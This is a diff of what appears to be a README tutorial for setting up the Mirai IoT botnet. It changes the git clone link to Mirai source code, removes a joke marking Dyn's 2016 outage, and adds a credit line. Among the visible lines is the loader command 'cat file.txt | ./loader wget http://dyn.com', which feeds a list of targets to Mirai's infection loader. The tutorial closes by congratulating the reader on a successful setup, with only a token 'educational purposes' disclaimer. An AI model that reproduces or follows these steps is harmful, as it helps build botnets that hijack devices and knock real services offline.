@@ -1,6 +1,5 @@
 
 
-
 ███╗   ███╗██╗██████╗  █████╗ ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
 ████╗ ████║██║██╔══██╗██╔══██╗██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
 ██╔████╔██║██║██████╔╝███████║██║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║  
@@ -60,7 +59,7 @@ Follow this code;
 
 code:
 
-git clone https://github.com/jgamblin/Mirai-Source-Code
+git clone https://github.com/DoHaiSon/Mirai_Botnet
 
 --------------------------------------------------------
 
@@ -652,10 +651,6 @@ cat file.txt | ./loader wget http://dyn.com
 
 -------------------------------#FINISH, THE END #-----------------
 
- R.I.P      R.I.P
-2001-2016  2004-
-DynDns      Facebook,YouTube,SIP(Service Iternet Provider) 
-
 
 
 
@@ -663,8 +658,11 @@ Congrats you setup mirai successfully!!
 
 
 
+Congrats for our friend Jihadi4Prez to do this help full to make a more detailed tutorial, if somebody whant to do a more detailed 
+tuto he can use this tuto to get a base.
+
+
+
 ** !!!!! FOR EDUCATIONAL PURPOSES ONLY !!!!!!!! **
 
 **AND NOT FOR DDOS ATTACKS**
-
-
